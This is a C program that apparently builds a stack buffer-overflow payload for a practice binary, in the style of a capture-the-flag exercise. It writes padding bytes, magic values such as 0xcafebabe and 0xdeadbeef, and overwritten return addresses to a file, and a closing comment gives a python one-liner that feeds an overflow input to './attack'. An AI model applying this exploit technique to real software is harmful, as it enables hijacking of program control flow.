#include <stdio.h>

int main(void)
{
	FILE *f = fopen("payload", "w");
	int i = 0;
	for(int i = 0; i < 64; i++) {
		fprintf(f, "%c", 'A');
	}	
	
	fprintf(f, "%c", 0xbe);
	fprintf(f, "%c", 0xba);
	fprintf(f, "%c", 0xfe);
	fprintf(f, "%c", 0xca);

    //08049182

    fprintf(f, "%c", 0xff);
	fprintf(f, "%c", 0xff);
	fprintf(f, "%c", 0xff);
	fprintf(f, "%c", 0xff);

    fprintf(f, "%c", 0x82);
	fprintf(f, "%c", 0x91);
	fprintf(f, "%c", 0x04);
	fprintf(f, "%c", 0x08);
	
	fprintf(f, "%c", '\n');


	for(int i = 0; i < 68; i++) {
		fprintf(f, "%c", 'A');
	}	


	//80491ce

	fprintf(f, "%c", 0xce);
	fprintf(f, "%c", 0x91);
	fprintf(f, "%c", 0x04);
	fprintf(f, "%c", 0x08);
	
	fprintf(f, "%c", 0xef);
	fprintf(f, "%c", 0xbe);
	fprintf(f, "%c", 0xad);
	fprintf(f, "%c", 0xde);



	fclose(f);

	return 0;
}
//python3 -c 'print ("A" * 92 + "\x1d\x00\x00\x00")' | ./attack 